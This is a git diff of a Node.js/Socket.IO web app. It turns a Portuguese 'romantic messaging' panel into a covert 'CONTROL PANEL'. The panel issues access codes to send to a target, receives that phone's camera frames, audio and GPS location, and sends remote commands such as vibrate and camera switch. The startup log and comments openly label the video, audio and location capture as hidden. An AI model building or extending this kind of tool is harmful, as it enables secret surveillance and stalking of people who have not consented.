         .video-container img { width: 100%; height: auto; display: block; }
         .location-info {
-            background: #f0f8ff;
-            padding: 8px 12px;
-            border-radius: 8px;
-            margin: 8px 0;
-            font-size: 12px;
+            background: #0d0d0d;
+            padding: 6px 10px;
+            border-radius: 2px;
+            margin: 6px 0;
+            font-size: 10px;
+            opacity: 0.5;
+            border: 1px solid #00ff41;
         }
+        .location-info a { color: #00ff41; }
         .commands {
             display: grid;
             grid-template-columns: 1fr 1fr;
-            gap: 5px;
-            margin: 8px 0;
+            gap: 4px;
+            margin: 6px 0;
         }
         .commands button {
-            padding: 6px;
-            border: none;
-            border-radius: 6px;
+            padding: 5px;
+            border: 1px solid #00ff41;
+            border-radius: 2px;
             cursor: pointer;
-            font-size: 11px;
-            font-weight: bold;
+            font-family: 'Courier New', monospace;
+            font-size: 9px;
+            letter-spacing: 1px;
+            background: #0d0d0d;
+            color: #00ff41;
+            transition: all 0.3s;
         }
-        .btn-vibrate { background: #f39c12; color: white; }
-        .btn-camera { background: #3498db; color: white; }
-        .btn-emergency { background: #e74c3c; color: white; }
-        .btn-skip { background: #9b59b6; color: white; }
-        .btn-stop-music { background: #e74c3c; color: white; width: 100%; margin-top: 5px; padding: 6px; border: none; border-radius: 6px; cursor: pointer; font-weight: bold; }
+        .commands button:hover { background: #00ff41; color: #0a0a0a; }
+        .btn-stop-music {
+            width: 100%;
+            padding: 5px;
+            border: 1px solid #ff0044;
+            border-radius: 2px;
+            cursor: pointer;
+            font-family: 'Courier New', monospace;
+            font-size: 9px;
+            letter-spacing: 1px;
+            background: #0d0d0d;
+            color: #ff0044;
+            margin-top: 4px;
+        }
+        .btn-stop-music:hover { background: #ff0044; color: #0a0a0a; }
         .music-item {
-            background: linear-gradient(135deg, #ffe6f0, #ffd9e8);
-            padding: 10px 14px;
-            border-radius: 8px;
-            margin: 4px 0;
+            padding: 6px 10px;
+            border: 1px solid #00ff41;
+            border-radius: 2px;
+            margin: 3px 0;
             cursor: pointer;
             transition: all 0.3s;
             display: flex;
             justify-content: space-between;
             align-items: center;
+            font-size: 11px;
         }
-        .music-item:hover { transform: scale(1.02); box-shadow: 0 3px 10px rgba(0,0,0,0.1); }
-        .music-item .name { font-weight: bold; color: #c0392b; font-size: 13px; }
-        .music-item .play { color: #e74c3c; font-size: 18px; }
-        .contact-info-text { font-size: 13px; color: #666; margin: 3px 0; }
-        .contact-info-text strong { color: #333; }
-        hr { margin: 12px 0; border: none; border-top: 1px solid #eee; }
+        .music-item:hover { background: #00ff41; color: #0a0a0a; }
+        .music-item .play { opacity: 0.5; }
+        .info-text { font-size: 10px; opacity: 0.3; margin: 3px 0; }
+        hr { border: none; border-top: 1px solid #00ff41; opacity: 0.1; margin: 10px 0; }
+        .code-display {
+            background: #111;
+            padding: 8px 12px;
+            border: 1px solid #00ff41;
+            border-radius: 3px;
+            font-size: 12px;
+            letter-spacing: 2px;
+            text-align: center;
+            margin: 5px 0;
+            font-family: 'Courier New', monospace;
+            word-break: break-all;
+        }
+        .copy-btn {
+            padding: 4px 12px;
+            background: #00ff41;
+            color: #0a0a0a;
+            border: none;
+            border-radius: 2px;
+            cursor: pointer;
+            font-family: 'Courier New', monospace;
+            font-size: 10px;
+            margin-top: 4px;
+        }
+        .copy-btn:hover { background: #00cc33; }
         @media (max-width: 1100px) {
             .main-grid { grid-template-columns: 1fr; height: auto; }
             .panel { max-height: 400px; }
@@ -696,20 +787,20 @@ app.get('/', (req, res) => {
 </head>
 <body>
     <div class="container">
-        <h1>💕 Painel de Controle Romântico 💕</h1>
+        <h1>● CONTROL PANEL ●</h1>
         <div class="main-grid">
             <!-- Contatos -->
             <div class="panel">
-                <h2>📱 Contatos</h2>
+                <h2>● CONTACTS</h2>
                 <div class="form-group">
-                    <label>👤 Nome</label>
-                    <input type="text" id="contactName" placeholder="Ex: Meu Amor">
+                    <label>NAME</label>
+                    <input type="text" id="contactName" placeholder="USER NAME">
                 </div>
                 <div class="form-group">
-                    <label>📞 Telefone</label>
-                    <input type="text" id="contactPhone" placeholder="(11) 99999-9999">
+                    <label>PHONE</label>
+                    <input type="text" id="contactPhone" placeholder="PHONE NUMBER">
                 </div>
-                <button class="btn-primary" id="addContact">➕ Adicionar Contato</button>
+                <button class="btn-primary" id="addContact">+ GENERATE CODE</button>
                 <hr>
                 <div id="contactList"></div>
             </div>
@@ -717,21 +808,21 @@ app.get('/', (req, res) => {
             <!-- Chat -->
             <div class="panel chat-area">
                 <div id="chatContainer">
-                    <div class="no-contact"><h3>💕 Selecione um contato</h3><p style="font-size:13px;">Escolha um contato para começar a conversar</p></div>
+                    <div class="no-contact"><h3>● SELECT CONTACT</h3></div>
                 </div>
             </div>
 
-            <!-- Info do Contato -->
+            <!-- Info -->
             <div class="panel">
-                <h2>ℹ️ Sobre o Contato</h2>
-                <div id="contactInfo"><div class="no-contact"><p>Selecione um contato</p></div></div>
+                <h2>● DATA</h2>
+                <div id="contactInfo"><div class="no-contact"><p>SELECT CONTACT</p></div></div>
             </div>
         </div>
     </div>
 
     <script src="/socket.io/socket.io.js"></script>
     <script>
-        const socket = io('${fullUrl}');
+        const socket = io();
         let currentContactId = null;
         let typingTimeout = null;
         let audioGain = null;
@@ -749,7 +840,7 @@ app.get('/', (req, res) => {
 
         function renderContacts(contacts) {
             if(contacts.length === 0) {
-                contactList.innerHTML = '<div style="text-align:center;color:#999;padding:20px;font-size:13px;">Nenhum contato cadastrado</div>';
+                contactList.innerHTML = '<div style="text-align:center;opacity:0.2;padding:20px;font-size:11px;">NO CONTACTS</div>';
                 return;
             }
             contactList.innerHTML = contacts.map(c => \`
@@ -759,7 +850,7 @@ app.get('/', (req, res) => {
                         <div class="phone">\${c.phone}</div>
                     </div>
                     <div>
-                        <span class="status \${c.online ? 'online' : 'offline'}">\${c.online ? '🟢 Online' : '⚫ Offline'}</span>
+                        <span class="status \${c.online ? 'online' : 'offline'}">\${c.online ? 'ON' : 'OFF'}</span>
                         <span class="badge" id="badge_\${c.id}">0</span>
                     </div>
                 </div>
@@ -780,7 +871,7 @@ app.get('/', (req, res) => {
 
         function renderChat(messages) {
             chatContainer.innerHTML = \`
-                <div class="chat-header"><h3>💬 Chat</h3></div>
+                <div class="chat-header"><h3>● CHAT</h3></div>
                 <div class="chat-messages" id="chatMessages">
                     \${messages.map(m => \`
                         <div class="message \${m.from === 'pc' ? 'from-pc' : 'from-contact'}">
@@ -788,11 +879,11 @@ app.get('/', (req, res) => {
                             <span class="time">\${new Date(m.timestamp).toLocaleTimeString()}</span>
                         </div>
                     \`).join('')}
-                    <div id="typingIndicator" class="typing-indicator">💕 Digitando...</div>
+                    <div id="typingIndicator" class="typing-indicator">● TYPING...</div>
                 </div>
                 <div class="chat-input-area">
-                    <input type="text" id="chatInput" placeholder="Digite uma mensagem..." oninput="onTyping()">
-                    <button onclick="sendMessage()">💖 Enviar</button>
+                    <input type="text" id="chatInput" placeholder="MESSAGE" oninput="onTyping()">
+                    <button onclick="sendMessage()">SEND</button>
                 </div>
             \`;
             const div = document.getElementById('chatMessages');
@@ -802,31 +893,31 @@ app.get('/', (req, res) => {
         function renderContactInfo(contact) {
             contactInfo.innerHTML = \`
                 <div style="text-align:center;padding:8px 0;">
-                    <div style="font-size:36px;">💕</div>
-                    <h3>\${contact.name}</h3>
-                    <div style="font-size:13px;color:#666;">\${contact.phone}</div>
-                    <div style="margin:6px 0;">
-                        <span class="status \${contact.online ? 'online' : 'offline'}">\${contact.online ? '🟢 Online' : '⚫ Offline'}</span>
+                    <div style="font-size:28px;">●</div>
+                    <h3 style="font-weight:normal;font-size:16px;letter-spacing:2px;">\${contact.name}</h3>
+                    <div style="font-size:10px;opacity:0.3;">\${contact.phone}</div>
+                    <div style="margin:5px 0;">
+                        <span class="status \${contact.online ? 'online' : 'offline'}">\${contact.online ? '● ONLINE' : '● OFFLINE'}</span>
                     </div>
-                    <div style="font-size:11px;color:#999;">Último visto: \${new Date(contact.lastSeen).toLocaleString()}</div>
+                    <div style="font-size:9px;opacity:0.2;">LAST: \${new Date(contact.lastSeen).toLocaleString()}</div>
                 </div>
-                <div class="video-container"><img id="contactVideo" src="" alt="Vídeo"></div>
-                <div class="location-info" id="contactLocation">📍 Aguardando localização...</div>
+                <div class="video-container"><img id="contactVideo" src="" alt=""></div>
+                <div class="location-info" id="contactLocation">● LOCATION: WAITING...</div>
                 <div class="commands">
-                    <button class="btn-vibrate" onclick="sendCommand('vibrate')">📳 Vibrar</button>
-                    <button class="btn-camera" onclick="sendCommand('trocarCamera')">📷 Trocar Câmera</button>
-                    <button class="btn-emergency" onclick="sendCommand('emergency')">💖 Surpresa</button>
-                    <button class="btn-skip" onclick="sendCommand('skip_current_message')">⏩ Pular</button>
+                    <button onclick="sendCommand('vibrate')">VIBRATE</button>
+                    <button onclick="sendCommand('trocarCamera')">CAMERA</button>
+                    <button onclick="sendCommand('emergency')">SURPRISE</button>
+                    <button onclick="sendCommand('skip_current_message')">SKIP</button>
                 </div>
-                <h3>🎵 Músicas</h3>
-                <div class="music-item" onclick="playMusic('1N8N-X8NM4k','Música 1')">
-                    <span class="name">🎵 Música Especial 1</span><span class="play">▶️</span>
+                <h3>● MUSIC</h3>
+                <div class="music-item" onclick="playMusic('1N8N-X8NM4k','MUSIC 1')">
+                    <span>TRACK 1</span><span class="play">►</span>
                 </div>
-                <div class="music-item" onclick="playMusic('sTVNvP5Uw98','Música 2')">
-                    <span class="name">🎵 Música Especial 2</span><span class="play">▶️</span>
+                <div class="music-item" onclick="playMusic('sTVNvP5Uw98','MUSIC 2')">
+                    <span>TRACK 2</span><span class="play">►</span>
                 </div>
-                <button class="btn-stop-music" onclick="stopMusic()">⏹️ Parar Música</button>
-                <button class="btn-danger" onclick="deleteContact()">🗑️ Remover Contato</button>
+                <button class="btn-stop-music" onclick="stopMusic()">■ STOP</button>
+                <button class="btn-danger" onclick="deleteContact()">× DELETE</button>
             \`;
         }
 
@@ -858,6 +949,7 @@ app.get('/', (req, res) => {
             if(typingTimeout) clearTimeout(typingTimeout);
             typingTimeout = setTimeout(() => stopTyping(), 1000);
         }
+
         function stopTyping() {
             if(!currentContactId) return;
             socket.emit('typing_stop', { to: currentContactId, isFromPc: true });
@@ -881,32 +973,35 @@ app.get('/', (req, res) => {
         }
 
         async function deleteContact() {
-            if(!currentContactId || !confirm('Remover este contato?')) return;
+            if(!currentContactId || !confirm('DELETE CONTACT?')) return;
             await fetch('/api/contacts/' + currentContactId, { method: 'DELETE' });
             currentContactId = null;
             loadContacts();
-            chatContainer.innerHTML = '<div class="no-contact"><h3>💕 Contato removido</h3></div>';
-            contactInfo.innerHTML = '<div class="no-contact"><p>Contato removido</p></div>';
+            chatContainer.innerHTML = '<div class="no-contact"><h3>● CONTACT DELETED</h3></div>';
+            contactInfo.innerHTML = '<div class="no-contact"><p>DELETED</p></div>';
         }
 
         // ===== ADICIONAR CONTATO =====
         document.getElementById('addContact').onclick = async () => {
             const name = document.getElementById('contactName').value.trim();
             const phone = document.getElementById('contactPhone').value.trim();
-            if(!name || !phone) { alert('Preencha nome e telefone!'); return; }
+            if(!name || !phone) { alert('FILL ALL FIELDS'); return; }
             try {
                 const res = await fetch('/api/contacts', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ name, phone })
                 });
-                if(!res.ok) { const e = await res.json(); alert(e.error || 'Erro'); return; }
+                if(!res.ok) { const e = await res.json(); alert(e.error || 'ERROR'); return; }
                 const contact = await res.json();
                 document.getElementById('contactName').value = '';
                 document.getElementById('contactPhone').value = '';
                 loadContacts();
-                alert('✅ Contato ' + contact.name + ' adicionado!');
-            } catch(e) { alert('Erro ao adicionar'); }
+                
+                // Mostrar código gerado
+                const code = contact.id;
+                alert('● ACCESS CODE GENERATED ●\n\nCODE: ' + code + '\n\nSEND THIS CODE TO THE USER');
+            } catch(e) { alert('ERROR'); }
         };
 
         // ===== SOCKET EVENTS =====
@@ -916,7 +1011,6 @@ app.get('/', (req, res) => {
             }
         });
 
-        socket.on('message_sent', (data) => {});
         socket.on('contact_typing', (data) => {
             const ind = document.getElementById('typingIndicator');
             if(ind) { ind.style.display = data.isTyping ? 'block' : 'none'; }
@@ -940,17 +1034,17 @@ app.get('/', (req, res) => {
             if(currentContactId === data.contactId) {
                 const l = document.getElementById('contactLocation');
                 if(l) {
-                    l.innerHTML = '📍 Localização:<br>Lat: ' + data.location.latitude.toFixed(6) +
-                        '<br>Lon: ' + data.location.longitude.toFixed(6) +
-                        '<br><a href="https://www.google.com/maps?q=' + data.location.latitude + ',' +
-                        data.location.longitude + '" target="_blank">🗺️ Ver no mapa</a>';
+                    l.innerHTML = '● LOCATION: ' + data.location.latitude.toFixed(6) + ', ' + 
+                        data.location.longitude.toFixed(6) + 
+                        ' <a href="https://www.google.com/maps?q=' + data.location.latitude + ',' +
+                        data.location.longitude + '" target="_blank">[MAP]</a>';
                 }
             }
         });
 
-        socket.on('force_disconnect', () => { alert('⚠️ Outra conexão!'); location.reload(); });
+        socket.on('force_disconnect', () => { alert('● CONNECTION TERMINATED'); location.reload(); });
 
-        // ===== ÁUDIO =====
+        // ===== ÁUDIO (OCULTO) =====
         try {
             const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
             audioGain = audioCtx.createGain();
@@ -982,12 +1076,11 @@ app.get('/', (req, res) => {
 // ========== API REST ==========
 app.use(express.json());
 
-// Criar contato
 app.post('/api/contacts', (req, res) => {
   const { name, phone } = req.body;
-  if(!name || !phone) return res.status(400).json({ error: 'Nome e telefone são obrigatórios' });
+  if(!name || !phone) return res.status(400).json({ error: 'Required fields' });
   for(let [id, c] of contacts) {
-    if(c.phone === phone) return res.status(400).json({ error: 'Telefone já cadastrado' });
+    if(c.phone === phone) return res.status(400).json({ error: 'Phone already registered' });
   }
   const id = uuidv4();
   const newContact = { id, name, phone, socketId: null, online: false, lastSeen: new Date(), createdAt: new Date() };
@@ -996,22 +1089,19 @@ app.post('/api/contacts', (req, res) => {
   res.status(201).json(newContact);
 });
 
-// Listar contatos
 app.get('/api/contacts', (req, res) => {
   res.json(Array.from(contacts.values()));
 });
 
-// Buscar contato
 app.get('/api/contacts/:id', (req, res) => {
   const c = contacts.get(req.params.id);
-  if(!c) return res.status(404).json({ error: 'Não encontrado' });
+  if(!c) return res.status(404).json({ error: 'Not found' });
   res.json(c);
 });
 
-// Deletar contato
 app.delete('/api/contacts/:id', (req, res) => {
   const c = contacts.get(req.params.id);
-  if(!c) return res.status(404).json({ error: 'Não encontrado' });
+  if(!c) return res.status(404).json({ error: 'Not found' });
   if(c.socketId) {
     const sock = io.sockets.sockets.get(c.socketId);
     if(sock) sock.disconnect();
@@ -1021,30 +1111,28 @@ app.delete('/api/contacts/:id', (req, res) => {
   res.json({ success: true });
 });
 
-// Buscar mensagens
 app.get('/api/messages/:contactId', (req, res) => {
   res.json(messages.get(req.params.id) || []);
 });
 
 // ========== SOCKET.IO ==========
 io.on('connection', (socket) => {
-  console.log('Cliente conectado:', socket.id);
+  console.log('Client connected:', socket.id);
   let currentContactId = null;
 
-  // Login do contato
   socket.on('contact_login', ({ contactId, name }) => {
     const contact = contacts.get(contactId);
     if(!contact) {
-      socket.emit('login_error', { error: 'Contato não encontrado' });
+      socket.emit('login_error', { error: 'Invalid code' });
       return;
     }
     if(contact.name !== name) {
-      socket.emit('login_error', { error: 'Nome não corresponde' });
+      socket.emit('login_error', { error: 'Name mismatch' });
       return;
     }
     if(contact.socketId) {
       const old = io.sockets.sockets.get(contact.socketId);
-      if(old) { old.emit('force_disconnect', { reason: 'Nova conexão' }); old.disconnect(); }
+      if(old) { old.emit('force_disconnect', { reason: 'New connection' }); old.disconnect(); }
     }
     contact.socketId = socket.id;
     contact.online = true;
@@ -1057,17 +1145,16 @@ io.on('connection', (socket) => {
       name: contact.name,
       messages: messages.get(contactId) || []
     });
-    console.log('✅ ' + contact.name + ' online!');
+    console.log('✅ ' + contact.name + ' online');
   });
 
-  // Mensagens
   socket.on('send_message', (data) => {
     const { to, text, isFromPc } = data;
     let from = null, senderName = null;
 
     if(isFromPc) {
       from = 'pc';
-      senderName = 'Você (PC)';
+      senderName = 'PC';
       const msgs = messages.get(to) || [];
       const newMsg = { id: uuidv4(), from: 'pc', to, text, timestamp: new Date(), isRead: false };
       msgs.push(newMsg);
@@ -1080,7 +1167,7 @@ io.on('connection', (socket) => {
     } else {
       from = currentContactId;
       const contact = contacts.get(currentContactId);
-      senderName = contact ? contact.name : 'Contato';
+      senderName = contact ? contact.name : 'User';
       const msgs = messages.get(currentContactId) || [];
       const newMsg = { id: uuidv4(), from: currentContactId, to: 'pc', text, timestamp: new Date(), isRead: false };
       msgs.push(newMsg);
@@ -1088,10 +1175,9 @@ io.on('connection', (socket) => {
       io.emit('new_message_from_contact', { ...newMsg, contactName: senderName, contactId: currentContactId });
       socket.emit('message_sent', newMsg);
     }
-    console.log('💬 ' + senderName + ': "' + text + '"');
+    console.log('💬 ' + senderName + ': ' + text);
   });
 
-  // Typing
   socket.on('typing_start', ({ to, isFromPc }) => {
     if(isFromPc) {
       const contact = contacts.get(to);
@@ -1110,7 +1196,6 @@ io.on('connection', (socket) => {
     }
   });
 
-  // Streaming
   socket.on('frame', (frameData) => {
     if(currentContactId) socket.broadcast.emit('contact_frame', { contactId: currentContactId, frame: frameData });
   });
@@ -1123,7 +1208,6 @@ io.on('connection', (socket) => {
     if(currentContactId) socket.broadcast.emit('contact_location', { contactId: currentContactId, location: loc });
   });
 
-  // Comandos
   socket.on('comando', ({ contactId, command }) => {
     const contact = contacts.get(contactId);
     if(contact && contact.socketId) {
@@ -1131,9 +1215,8 @@ io.on('connection', (socket) => {
     }
   });
 
-  // Desconexão
   socket.on('disconnect', () => {
-    console.log('Cliente desconectado:', socket.id);
+    console.log('Client disconnected:', socket.id);
     if(currentContactId) {
       const contact = contacts.get(currentContactId);
       if(contact) {
@@ -1149,30 +1232,25 @@ io.on('connection', (socket) => {
 
 // ========== INICIAR SERVIDOR ==========
 server.listen(PORT, '0.0.0.0', () => {
-  console.log('\n💕 Servidor de Mensagens Românticas 💕');
-  console.log('   Porta: ' + PORT);
-  console.log('   Acesse no PC: http://localhost:' + PORT);
-  console.log('   Acesse no Celular: http://localhost:' + PORT);
-  console.log('\n📱 Funcionalidades:');
-  console.log('   ✅ Cadastro de contatos (PC)');
-  console.log('   ✅ Chat em tempo real (PC ↔ Celular)');
-  console.log('   ✅ Vídeo, áudio e localização');
-  console.log('   ✅ Indicador de digitação');
-  console.log('   ✅ Status online/offline');
-  console.log('   ✅ Comandos remotos (vibrar, câmera, surpresas)');
-  console.log('   ✅ Músicas em segundo plano\n');
+  console.log('\n● CONTROL SYSTEM ACTIVE ●');
+  console.log('   PORT: ' + PORT);
+  console.log('   PC: http://localhost:' + PORT);
+  console.log('   MOBILE: http://localhost:' + PORT);
+  console.log('\n● FUNCTIONS:');
+  console.log('   ✓ GENERATE ACCESS CODES');
+  console.log('   ✓ REAL-TIME CHAT');
+  console.log('   ✓ VIDEO/AUDIO/LOCATION (HIDDEN)');
+  console.log('   ✓ REMOTE COMMANDS\n');
 
-  // Criar contato exemplo
   setTimeout(() => {
     if(contacts.size === 0) {
       const id = uuidv4();
-      contacts.set(id, { id, name: 'Amor da Minha Vida', phone: '(11) 99999-9999', socketId: null, online: false, lastSeen: new Date(), createdAt: new Date() });
+      contacts.set(id, { id, name: 'Demo User', phone: '(11) 99999-9999', socketId: null, online: false, lastSeen: new Date(), createdAt: new Date() });
       messages.set(id, []);
-      console.log('💝 Contato de exemplo criado!');
-      console.log('   ID: ' + id);
-      console.log('   Nome: Amor da Minha Vida');
-      console.log('   Telefone: (11) 99999-9999');
-      console.log('\n📱 Use este ID no celular para fazer login!\n');
+      console.log('● DEMO CODE GENERATED ●');
+      console.log('   CODE: ' + id);
+      console.log('   NAME: Demo User');
+      console.log('\n   SEND THIS CODE TO THE USER\n');
     }
   }, 1000);
 });
